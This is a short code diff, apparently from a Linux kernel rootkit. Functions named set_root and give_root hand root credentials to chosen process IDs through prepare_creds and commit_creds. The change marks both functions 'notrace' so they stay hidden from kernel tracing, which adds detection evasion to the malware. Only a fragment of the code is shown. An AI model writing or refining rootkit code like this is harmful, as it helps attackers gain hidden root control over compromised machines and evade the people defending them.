@@ -6,7 +6,7 @@
 
 LIST_HEAD(pids_waiting_for_root);
 
-void set_root(void)
+notrace void set_root(void)
 {
     struct cred *creds;
     creds = prepare_creds();
@@ -24,7 +24,7 @@ void set_root(void)
     commit_creds(creds);
 }
 
-void give_root(int pid)
+notrace void give_root(int pid)
 {
     struct pid_list *pid_entry;
 
